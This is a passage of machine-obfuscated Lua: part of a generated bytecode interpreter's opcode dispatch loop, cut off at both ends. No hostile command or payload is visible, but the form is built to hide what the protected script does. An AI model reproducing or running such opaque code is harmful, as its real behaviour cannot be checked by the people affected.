w[y[469]]=w[y[345]][y[491]];else n=n+1;end else if a<=6 then y=f[n];else if 8~=a then w[y[469]]=w[y[345]][y[491]];else n=n+1;end end end end else if a<=13 then if a<=10 then if 9==a then y=f[n];else w[y[469]]=w[y[345]][y[491]];end else if a<=11 then n=n+1;else if 12==a then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end else if a<=15 then if 15>a then n=n+1;else y=f[n];end else if a<=16 then c=y[469]else if a==17 then w[c]=w[c](w[c+1])else break end end end end end a=a+1 end end;elseif(z<=285)then local a=0 while true do if(a==7 or a<7)then if(a<3 or a==3)then if a<=1 then if 0<a then n=n+1;else w[y[469]]=w[y[345]][y[491]];end else if(3>a)then y=f[n];else w[y[469]][y[345]]=w[y[491]];end end else if(a<=5)then if a~=5 then n=(n+1);else y=f[n];end else if(6==a)then w[y[469]]=w[y[345]][y[491]];else n=(n+1);end end end else if(a<11 or a==11)then if(a==9 or a<9)then if a<9 then y=f[n];else w[y[469]]=h[y[345]];end else if not(a==11)then n=n+1;else y=f[n];end end else if(a<=13)then if 13>a then w[y[469]]=w[y[345]][y[491]];else n=n+1;end else if(a<=14)then y=f[n];else if(a>15)then break else if(w[y[469]]~=w[y[491]])then n=n+1;else n=y[345];end;end end end end end a=(a+1)end elseif(287~=z)then local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if a<1 then c=nil else w[y[469]]=j[y[345]];end else if 3>a then n=n+1;else y=f[n];end end else if a<=5 then if 5~=a then w[y[469]]=y[345];else n=n+1;end else if a==6 then y=f[n];else w[y[469]]=w[y[345]][w[y[491]]];end end end else if a<=11 then if a<=9 then if a>8 then y=f[n];else n=n+1;end else if 10<a then n=n+1;else w[y[469]]=w[y[345]];end end else if a<=13 then if a>12 then c=y[469]else y=f[n];end else if a>14 then break else w[c]=w[c](w[c+1])end end end end a=a+1 end else local a=0 while true do if a<=6 then if a<=2 then if a<=0 then w[y[469]]=w[y[345]][y[491]];else if a==1 then n=n+1;else y=f[n];end end else if a<=4 then if a<4 then w[y[469]]=w[y[345]][y[491]];else n=n+1;end else if a<6 then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end else if a<=9 then if a<=7 then n=n+1;else if 9~=a then y=f[n];else w[y[469]][y[345]]=w[y[491]];end end else if a<=11 then if 10==a then n=n+1;else y=f[n];end else if 13>a then n=y[345];else break end end end end a=a+1 end end;elseif 290>=z then if(288>z or 288==z)then local a,c=0 while true do if a<=13 then if a<=6 then if a<=2 then if a<=0 then c=nil else if 1<a then n=n+1;else w[y[469]]={};end end else if a<=4 then if 3==a then y=f[n];else w[y[469]]=h[y[345]];end else if 5<a then y=f[n];else n=n+1;end end end else if a<=9 then if a<=7 then w[y[469]]=w[y[345]][y[491]];else if 9>a then n=n+1;else y=f[n];end end else if a<=11 then if a==10 then w[y[469]][y[345]]=w[y[491]];else n=n+1;end else if 12==a then y=f[n];else w[y[469]]=j[y[345]];end end end end else if a<=20 then if a<=16 then if a<=14 then n=n+1;else if a<16 then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end else if a<=18 then if 18>a then n=n+1;else y=f[n];end else if a~=20 then w[y[469]]=j[y[345]];else n=n+1;end end end else if a<=23 then if a<=21 then y=f[n];else if a~=23 then w[y[469]]=w[y[345]][y[491]];else n=n+1;end end else if a<=25 then if 25>a then y=f[n];else c=y[469]end else if 27~=a then w[c]=w[c]()else break end end end end end a=a+1 end elseif(z>289)then local a,c,e,q=0 while true do if a<=10 then if a<=4 then if a<=1 then if 1~=a then c=nil else e=nil end else if a<=2 then q=nil else if a>3 then n=n+1;else w[y[469]]=h[y[345]];end end end else if a<=7 then if a<=5 then y=f[n];else if a<7 then w[y[469]]=w[y[345]][y[491]];else n=n+1;end end else if a<=8 then y=f[n];else if a>9 then n=n+1;else w[y[469]]=w[y[345]][y[491]];end end end end else if a<=16 then if a<=13 then if a<=11 then y=f[n];else if a<13 then w[y[469]]=h[y[345]];else n=n+1;end end else if a<=14 then y=f[n];else if a<16 then w[y[469]]=w[y[345]][y[491]];else n=n+1;end end end else if a<=19 then if a<=17 then y=f[n];else if 18==a then q=y[345];else e=y[491];end end else if a<=20 then c=k(w,g,q,e);else if a~=22 then w[y[469]]=c;else break end end end end end a=a+1 end else local a,c,e,q=0 while true do if a<=9 then if a<=4 then if a<=1 then if 0<a then e=nil else c=nil end else if a<=2 then q=nil else if 3<a then n=n+1;else w[y[469]]=j[y[345]];end end end else if a<=6 then if a>5 then w[y[469]]=w[y[345]][y[491]];else y=f[n];end else if a<=7 then n=n+1;else if a~=9 then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end end else if a<=14 then if a<=11 then if 11~=a then n=n+1;else y=f[n];end else if a<=12 then w[y[469]]=w[y[345]][y[491]];else if 13<a then y=f[n];else n=n+1;end end end else if a<=16 then if a==15 then q=y[469]else e={w[q](w[q+1])};end else if a<=17 then c=0;else if 19>a then for x=q,y[491]do c=c+1;w[x]=e[c];end else break end end end end end a=a+1 end end;elseif(291>=z)then local a,c=0 while true do if a<=10 then if a<=4 then if a<=1 then if 0<a then w[y[469]]=j[y[345]];else c=nil end else if a<=2 then n=n+1;else if a<4 then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end else if a<=7 then if a<=5 then n=n+1;else if 6==a then y=f[n];else w[y[469]]=y[345];end end else if a<=8 then n=n+1;else if a<10 then y=f[n];else w[y[469]]=y[345];end end end end else if a<=15 then if a<=12 then if a==11 then n=n+1;else y=f[n];end else if a<=13 then w[y[469]]=y[345];else if 15>a then n=n+1;else y=f[n];end end end else if a<=18 then if a<=16 then w[y[469]]=y[345];else if a<18 then n=n+1;else y=f[n];end end else if a<=19 then c=y[469]else if 21~=a then w[c]=w[c](r(w,c+1,y[345]))else break end end end end end a=a+1 end elseif not(292~=z)then local a,c=0 while true do if a<=8 then if a<=3 then if a<=1 then if 0<a then w[y[469]]=j[y[345]];else c=nil end else if 2==a then n=n+1;else y=f[n];end end else if a<=5 then if 5>a then w[y[469]]=w[y[345]][y[491]];else n=n+1;end else if a<=6 then y=f[n];else if 8~=a then w[y[469]]=y[345];else n=n+1;end end end end else if a<=13 then if a<=10 then if 9==a then y=f[n];else w[y[469]]=y[345];end else if a<=11 then n=n+1;else if a==12 then y=f[n];else w[y[469]]=y[345];end end end else if a<=15 then if 14<a then y=f[n];else n=n+1;end else if a<=16 then c=y[469]else if a==17 then w[c]=w[c](r(w,c+1,y[345]))else break end end end end end a=a+1 end else local a=0 while true do if a<=9 then if a<=4 then if a<=1 then if 1~=a then w[y[469]][y[345]]=y[491];else n=n+1;end else if a<=2 then y=f[n];else if 4>a then w[y[469]]={};else n=n+1;end end end else if a<=6 then if a>5 then w[y[469]][y[345]]=w[y[491]];else y=f[n];end else if a<=7 then n=n+1;else if 8==a then y=f[n];else w[y[469]]=h[y[345]];end end end end else if a<=14 then if a<=11 then if a~=11 then n=n+1;else y=f[n];end else if a<=12 then w[y[469]]=w[y[345]][y[491]];else if 13<a then y=f[n];else n=n+1;end end end else if a<=16 then if a<16 then w[y[469]][y[345]]=w[y[491]];else n=n+1;end else if a<=17 then y=f[n];else if a==18 then w[y[469]][y[345]]=w[y[491]];else break end end end end end a=a+1 end end;elseif 299>=z then if 296>=z then if z<=294 then w[y[469]]=h[y[345]];elseif 295==z then w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];if w[y[469]]then n=n+1;else n=y[345];end;else local a;w[y[469]]=w[y[345]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];a=y[469]w[a]=w[a](r(w,a+1,y[345]))end;elseif 297>=z then local a;w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];w[y[469]]=w[y[345]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];a=y[469]w[a]=w[a](r(w,a+1,y[345]))elseif z<299 then local a;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];a=y[469]w[a]=w[a](r(w,a+1,y[345]))else if(w[y[469]]~=y[491])then n=n+1;else n=y[345];end;end;elseif 302>=z then if 300>=z then local a=0 while true do if(a<=14)then if a<=6 then if(a==2 or a<2)then if(a<=0)then w={};else if 1==a then for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;else n=n+1;end end else if(a<=4)then if not(a==4)then y=f[n];else w[y[469]]=h[y[345]];end else if a<6 then n=(n+1);else y=f[n];end end end else if a<=10 then if a<=8 then if(a<8)then w[y[469]]=w[y[345]][y[491]];else n=n+1;end else if not(10==a)then y=f[n];else w[y[469]]=h[y[345]];end end else if(a<=12)then if not(12==a)then n=n+1;else y=f[n];end else if(a==13)then w[y[469]]={};else n=(n+1);end end end end else if(a<=21)then if(a<=17)then if(a<=15)then y=f[n];else if not(a~=16)then w[y[469]]={};else n=(n+1);end end else if(a<19 or a==19)then if not(19==a)then y=f[n];else w[y[469]][y[345]]=w[y[491]];end else if not(20~=a)then n=(n+1);else y=f[n];end end end else if(a<=25)then if a<=23 then if(22<a)then n=(n+1);else w[y[469]]=j[y[345]];end else if not(25==a)then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end else if a<=27 then if(27>a)then n=n+1;else y=f[n];end else if a<29 then if w[y[469]]then n=n+1;else n=y[345];end;else break end end end end end a=a+1 end elseif 302~=z then local a;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];a=y[469]w[a](r(w,a+1,y[345]))else local a=y[469]w[a](w[a+1])end;elseif 303>=z then local a=y[469]w[a](r(w,a+1,p))elseif 304==z then local a;local c;local e;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];e=y[469]c={w[e](w[e+1])};a=0;for q=e,y[491]do a=a+1;w[q]=c[a];end else local a=y[469];local c,e,q=w[a],w[a+1],w[a+2];local c=c+q;w[a]=c;if q>0 and c<=e or q<0 and c>=e then n=y[345];w[a+3]=c;end;end;elseif z<=317 then if 311>=z then if 308>=z then if 306>=z then local a;local c;local e;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];e=y[469]c={w[e](w[e+1])};a=0;for q=e,y[491]do a=a+1;w[q]=c[a];end elseif 307<z then local a;w[y[469]]=w[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]];n=n+1;y=f[n];a=y[469]w[a]=w[a](r(w,a+1,y[345]))else if(y[469]<=w[y[491]])then n=n+1;else n=y[345];end;end;elseif z<=309 then local a;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];a=y[469]w[a]=w[a](r(w,a+1,y[345]))elseif z==310 then local a=y[469]w[a](r(w,a+1,y[345]))else j[y[345]]=w[y[469]];end;elseif z<=314 then if 312>=z then local a=y[469]local c={w[a](r(w,a+1,y[345]))};local e=0;for q=a,y[491]do e=e+1;w[q]=c[e];end;elseif 313==z then local a;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=false;n=n+1;y=f[n];a=y[469]w[a](w[a+1])else local a;local c,e;local q;w[y[469]]=w[y[345]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];q=y[469]c,e=i(w[q](r(w,q+1,y[345])))p=e+q-1 a=0;for e=q,p do a=a+1;w[e]=c[a];end;end;elseif z<=315 then if(w[y[469]]~=w[y[491]])then n=y[345];else n=n+1;end;elseif 317>z then local a;local c;local e;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];e=y[469]c={w[e](w[e+1])};a=0;for q=e,y[491]do a=a+1;w[q]=c[a];end else local a;w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];a=y[469]w[a]=w[a](r(w,a+1,y[345]))end;elseif z<=323 then if 320>=z then if 318>=z then local a=y[469];local c=w[y[345]];w[a+1]=c;w[a]=c[w[y[491]]];elseif z<320 then local a;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];a=y[469]w[a]=w[a](w[a+1])else w[y[469]]=h[y[345]];end;elseif z<=321 then w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];n=y[345];elseif 322==z then local a=y[469];do return w[a],w[a+1]end else local a=y[469];do return w[a](r(w,a+1,y[345]))end;end;elseif z<=326 then if(324==z or 324>z)then if w[y[469]]then n=(n+1);else n=y[345];end;elseif(z<326)then local a,c=0 while true do if a<=10 then if a<=4 then if a<=1 then if a<1 then c=nil else w[y[469]]=j[y[345]];end else if a<=2 then n=n+1;else if a~=4 then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end else if a<=7 then if a<=5 then n=n+1;else if 7>a then y=f[n];else w[y[469]]=y[345];end end else if a<=8 then n=n+1;else if a>9 then w[y[469]]=y[345];else y=f[n];end end end end else if a<=15 then if a<=12 then if a~=12 then n=n+1;else y=f[n];end else if a<=13 then w[y[469]]=y[345];else if 14<a then y=f[n];else n=n+1;end end end else if a<=18 then if a<=16 then w[y[469]]=y[345];else if 18~=a then n=n+1;else y=f[n];end end else if a<=19 then c=y[469]else if 20<a then break else w[c]=w[c](r(w,c+1,y[345]))end end end end end a=a+1 end else local a,c=0 while true do if a<=8 then if a<=3 then if a<=1 then if 0==a then c=nil else w[y[469]]=w[y[345]][y[491]];end else if 2<a then y=f[n];else n=n+1;end end else if a<=5 then if a<5 then w[y[469]]=w[y[345]][y[491]];else n=n+1;end else if a<=6 then y=f[n];else if 7==a then w[y[469]]=w[y[345]][y[491]];else n=n+1;end end end end else if a<=13 then if a<=10 then if 9<a then w[y[469]]=w[y[345]][y[491]];else y=f[n];end else if a<=11 then n=n+1;else if 13~=a then y=f[n];else w[y[469]]=false;end end end else if a<=15 then if a~=15 then n=n+1;else y=f[n];end else if a<=16 then c=y[469]else if 18~=a then w[c](w[c+1])else break end end end end end a=a+1 end end;elseif z<=327 then local a;local c;local e;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];e=y[345];c=y[491];a=k(w,g,e,c);w[y[469]]=a;elseif 328<z then w[y[469]]=false;else w[y[469]]=b(d[y[345]],nil,j);end;elseif z<=353 then if(341>z or 341==z)then if(z<335 or z==335)then if z<=332 then if(z<330 or z==330)then local a,c=0 while true do if a<=12 then if a<=5 then if a<=2 then if a<=0 then c=nil else if 1<a then for e=0,u,1 do if e<o then w[e]=s[e+1];else break;end;end;else w={};end end else if a<=3 then n=n+1;else if a~=5 then y=f[n];else w[y[469]]=h[y[345]];end end end else if a<=8 then if a<=6 then n=n+1;else if 7==a then y=f[n];else w[y[469]]=j[y[345]];end end else if a<=10 then if a>9 then y=f[n];else n=n+1;end else if a>11 then n=n+1;else w[y[469]]=w[y[345]][y[491]];end end end end else if a<=18 then if a<=15 then if a<=13 then y=f[n];else if 15>a then w[y[469]]=y[345];else n=n+1;end end else if a<=16 then y=f[n];else if 17<a then n=n+1;else w[y[469]]=y[345];end end end else if a<=21 then if a<=19 then y=f[n];else if 21~=a then w[y[469]]=y[345];else n=n+1;end end else if a<=23 then if 22==a then y=f[n];else c=y[469]end else if a<25 then w[c]=w[c](r(w,c+1,y[345]))else break end end end end end a=a+1 end elseif 332>z then local a=y[469];local c=w[y[345]];w[(a+1)]=c;w[a]=c[w[y[491]]];else local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if 0<a then w[y[469]]=h[y[345]];else c=nil end else if 2==a then n=n+1;else y=f[n];end end else if a<=5 then if 4<a then n=n+1;else w[y[469]]=w[y[345]][y[491]];end else if 6==a then y=f[n];else w[y[469]]=y[345];end end end else if a<=11 then if a<=9 then if 8==a then n=n+1;else y=f[n];end else if a>10 then n=n+1;else w[y[469]]=y[345];end end else if a<=13 then if a~=13 then y=f[n];else c=y[469]end else if 14==a then w[c]=w[c](r(w,c+1,y[345]))else break end end end end a=a+1 end end;elseif(z==333 or z<333)then local a=0 while true do if a<=6 then if a<=2 then if a<=0 then w[y[469]]=false;else if 1==a then n=n+1;else y=f[n];end end else if a<=4 then if 3<a then n=n+1;else w[y[469]]=h[y[345]];end else if 5==a then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end else if a<=9 then if a<=7 then n=n+1;else if a>8 then w[y[469]]=w[y[345]][w[y[491]]];else y=f[n];end end else if a<=11 then if a==10 then n=n+1;else y=f[n];end else if 12<a then break else if(w[y[469]]~=y[491])then n=n+1;else n=y[345];end;end end end end a=a+1 end elseif(335>z)then local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if 1>a then c=nil else w[y[469]]=w[y[345]][y[491]];end else if 3~=a then n=n+1;else y=f[n];end end else if a<=5 then if a~=5 then w[y[469]]=y[345];else n=n+1;end else if 6<a then w[y[469]]=h[y[345]];else y=f[n];end end end else if a<=11 then if a<=9 then if 8<a then y=f[n];else n=n+1;end else if 10==a then w[y[469]]=w[y[345]][y[491]];else n=n+1;end end else if a<=13 then if a>12 then c=y[469]else y=f[n];end else if 14<a then break else w[c]=w[c](r(w,c+1,y[345]))end end end end a=a+1 end else local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if a>0 then w[y[469]]=h[y[345]];else c=nil end else if a==2 then n=n+1;else y=f[n];end end else if a<=5 then if 5~=a then w[y[469]]=w[y[345]][y[491]];else n=n+1;end else if a~=7 then y=f[n];else w[y[469]]=y[345];end end end else if a<=11 then if a<=9 then if 8<a then y=f[n];else n=n+1;end else if a>10 then n=n+1;else w[y[469]]=y[345];end end else if a<=13 then if a==12 then y=f[n];else c=y[469]end else if a~=15 then w[c]=w[c](r(w,c+1,y[345]))else break end end end end a=a+1 end end;elseif(z<338 or z==338)then if(z<=336)then local a=0 while true do if(a<14 or a==14)then if(a==6 or a<6)then if a<=2 then if(a==0 or a<0)then w={};else if not(2==a)then for c=0,u,1 do if(c<o)then w[c]=s[c+1];else break;end;end;else n=n+1;end end else if(a<=4)then if 3<a then w[y[469]]=h[y[345]];else y=f[n];end else if 6>a then n=n+1;else y=f[n];end end end else if a<=10 then if a<=8 then if not(8==a)then w[y[469]]=w[y[345]][y[491]];else n=n+1;end else if(10>a)then y=f[n];else w[y[469]]=h[y[345]];end end else if a<=12 then if a==11 then n=(n+1);else y=f[n];end else if 14>a then w[y[469]]={};else n=n+1;end end end end else if(a<=21)then if(a==17 or a<17)then if a<=15 then y=f[n];else if a==16 then w[y[469]]={};else n=(n+1);end end else if(a<19 or a==19)then if(a<19)then y=f[n];else w[y[469]][y[345]]=w[y[491]];end else if a>20 then y=f[n];else n=(n+1);end end end else if(a==25 or a<25)then if(a==23 or a<23)then if not(a==23)then w[y[469]]=j[y[345]];else n=n+1;end else if not(a==25)then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end else if(a<=27)then if not(26~=a)then n=(n+1);else y=f[n];end else if a>28 then break else if w[y[469]]then n=(n+1);else n=y[345];end;end end end end end a=(a+1)end elseif(337==z)then local a,c=0 while true do if a<=14 then if(a<6 or a==6)then if a<=2 then if(a==0 or a<0)then c=nil else if(1<a)then n=n+1;else w[y[469]]=w[y[345]][y[491]];end end else if a<=4 then if 4>a then y=f[n];else w[y[469]]=w[y[345]][y[491]];end else if 5<a then y=f[n];else n=(n+1);end end end else if(a<=10)then if a<=8 then if(a<8)then w[y[469]]=w[y[345]][y[491]];else n=(n+1);end else if not(a~=9)then y=f[n];else w[y[469]]=w[y[345]]*y[491];end end else if(a<=12)then if 12>a then n=(n+1);else y=f[n];end else if 13<a then n=n+1;else w[y[469]]=(w[y[345]]+w[y[491]]);end end end end else if(a<22 or a==22)then if(a<=18)then if a<=16 then if(a~=16)then y=f[n];else w[y[469]]=j[y[345]];end else if a<18 then n=n+1;else y=f[n];end end else if(a<=20)then if a~=20 then w[y[469]]=w[y[345]][y[491]];else n=(n+1);end else if a~=22 then y=f[n];else w[y[469]]=w[y[345]];end end end else if(a<=26)then if(a==24 or a<24)then if 24>a then n=(n+1);else y=f[n];end else if a<26 then w[y[469]]=w[y[345]]+w[y[491]];else n=(n+1);end end else if(a==28 or a<28)then if not(a==28)then y=f[n];else c=y[469]end else if(29==a)then w[c]=w[c](r(w,c+1,y[345]))else break end end end end end a=a+1 end else local a,c=0 while true do if(a==7 or a<7)then if(a<=3)then if(a==1 or a<1)then if not(a~=0)then c=nil else w[y[469]]=h[y[345]];end else if(2==a)then n=(n+1);else y=f[n];end end else if a<=5 then if not(5==a)then w[y[469]]=y[345];else n=(n+1);end else if not(7==a)then y=f[n];else w[y[469]]=y[345];end end end else if a<=11 then if a<=9 then if not(a==9)then n=n+1;else y=f[n];end else if(a>10)then n=n+1;else w[y[469]]=y[345];end end else if(a<13 or a==13)then if(a>12)then c=y[469]else y=f[n];end else if(a>14)then break else w[c]=w[c](r(w,(c+1),y[345]))end end end end a=a+1 end end;elseif(z<339 or z==339)then w[y[469]]();elseif z<341 then local a=0 while true do if a<=9 then if a<=4 then if a<=1 then if a==0 then w[y[469]]={};else n=n+1;end else if a<=2 then y=f[n];else if a~=4 then w[y[469]]={};else n=n+1;end end end else if a<=6 then if 5<a then w[y[469]]={};else y=f[n];end else if a<=7 then n=n+1;else if a>8 then w[y[469]]={};else y=f[n];end end end end else if a<=14 then if a<=11 then if 11~=a then n=n+1;else y=f[n];end else if a<=12 then w[y[469]]={};else if 14>a then n=n+1;else y=f[n];end end end else if a<=16 then if 15<a then n=n+1;else w[y[469]]=y[345];end else if a<=17 then y=f[n];else if 18==a then w[y[469]]=w[y[345]][w[y[491]]];else break end end end end end a=a+1 end else w[y[469]]=w[y[345]]-y[491];end;elseif(347==z or 347>z)then if(344>=z)then if(z<342 or z==342)then w[y[469]]=w[y[345]];elseif not(z==344)then if(y[469]<w[y[491]])then n=(n+1);else n=y[345];end;else w[y[469]]={};end;elseif 345>=z then local a,c,e=0 while true do if(a<=24)then if(a<11 or a==11)then if a<=5 then if a<=2 then if(a==0 or a<0)then c=nil else if 1==a then e=nil else w[y[469]]={};end end else if a<=3 then n=(n+1);else if not(5==a)then y=f[n];else w[y[469]]=h[y[345]];end end end else if(a<=8)then if(a<6 or a==6)then n=(n+1);else if a~=8 then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end else if(a==9 or a<9)then n=(n+1);else if(a<11)then y=f[n];else w[y[469]]=h[y[345]];end end end end else if a<=17 then if(a<=14)then if(a<12 or a==12)then n=n+1;else if a~=14 then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end else if(a==15 or a<15)then n=(n+1);else if(17~=a)then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end else if(a<20 or a==20)then if(a<=18)then n=(n+1);else if a<20 then y=f[n];else w[y[469]]={};end end else if(a==22 or a<22)then if(a==21)then n=n+1;else y=f[n];end else if(23<a)then n=(n+1);else w[y[469]]={};end end end end end else if(a==37 or a<37)then if(a<30 or a==30)then if a<=27 then if(a<25 or a==25)then y=f[n];else if not(26~=a)then w[y[469]]=h[y[345]];else n=n+1;end end else if(a<=28)then y=f[n];else if(30>a)then w[y[469]][y[345]]=w[y[491]];else n=(n+1);end end end else if(a==33 or a<33)then if(a==31 or a<31)then y=f[n];else if(33~=a)then w[y[469]]=h[y[345]];else n=n+1;end end else if(a<35 or a==35)then if(a>34)then w[y[469]][y[345]]=w[y[491]];else y=f[n];end else if 37>a then n=(n+1);else y=f[n];end end end end else if(a==43 or a<43)then if(a<=40)then if a<=38 then w[y[469]][y[345]]=w[y[491]];else if not(a~=39)then n=n+1;else y=f[n];end end else if(a<41 or a==41)then w[y[469]]={r({},1,y[345])};else if not(a==43)then n=(n+1);else y=f[n];end end end else if(a<46 or a==46)then if(a==44 or a<44)then w[y[469]]=w[y[345]];else if not(a==46)then n=n+1;else y=f[n];end end else if a<=48 then if not(a~=47)then e=y[469];else c=w[e];end else if a<50 then for q=(e+1),y[345]do t(c,w[q])end;else break end end end end end end a=a+1 end elseif(347>z)then w[y[469]]=(w[y[345]]-w[y[491]]);else local a,c,e,q=0 while true do if a<=9 then if a<=4 then if a<=1 then if a>0 then e=nil else c=nil end else if a<=2 then q=nil else if 4>a then w[y[469]]=h[y[345]];else n=n+1;end end end else if a<=6 then if 6>a then y=f[n];else w[y[469]]=h[y[345]];end else if a<=7 then n=n+1;else if a~=9 then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end end else if a<=14 then if a<=11 then if 10<a then y=f[n];else n=n+1;end else if a<=12 then w[y[469]]=w[y[345]][w[y[491]]];else if a~=14 then n=n+1;else y=f[n];end end end else if a<=16 then if a>15 then e={w[q](w[q+1])};else q=y[469]end else if a<=17 then c=0;else if 18<a then break else for x=q,y[491]do c=c+1;w[x]=e[c];end end end end end end a=a+1 end end;elseif 350>=z then if z<=348 then local a,c,e,q,x=0 while true do if a<=11 then if a<=5 then if a<=2 then if a<=0 then c=nil else if a>1 then x=nil else e,q=nil end end else if a<=3 then w[y[469]]=w[y[345]][w[y[491]]];else if a==4 then n=n+1;else y=f[n];end end end else if a<=8 then if a<=6 then w[y[469]]=w[y[345]];else if 7==a then n=n+1;else y=f[n];end end else if a<=9 then w[y[469]]=y[345];else if a==10 then n=n+1;else y=f[n];end end end end else if a<=17 then if a<=14 then if a<=12 then w[y[469]]=y[345];else if a~=14 then n=n+1;else y=f[n];end end else if a<=15 then w[y[469]]=y[345];else if a<17 then n=n+1;else y=f[n];end end end else if a<=20 then if a<=18 then x=y[469]else if 19<a then p=q+x-1 else e,q=i(w[x](r(w,x+1,y[345])))end end else if a<=21 then c=0;else if 22<a then break else for i=x,p do c=c+1;w[i]=e[c];end;end end end end end a=a+1 end elseif(350~=z)then local a,c=0 while true do if a<=9 then if a<=4 then if a<=1 then if a==0 then c=nil else w={};end else if a<=2 then for e=0,u,1 do if e<o then w[e]=s[e+1];else break;end;end;else if a~=4 then n=n+1;else y=f[n];end end end else if a<=6 then if a<6 then w[y[469]]=j[y[345]];else n=n+1;end else if a<=7 then y=f[n];else if a<9 then w[y[469]]=w[y[345]][y[491]];else n=n+1;end end end end else if a<=14 then if a<=11 then if 10<a then w[y[469]]=h[y[345]];else y=f[n];end else if a<=12 then n=n+1;else if a<14 then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end else if a<=16 then if a<16 then n=n+1;else y=f[n];end else if a<=17 then c=y[469]else if 18<a then break else w[c]=w[c](w[c+1])end end end end end a=a+1 end else local a=0 while true do if 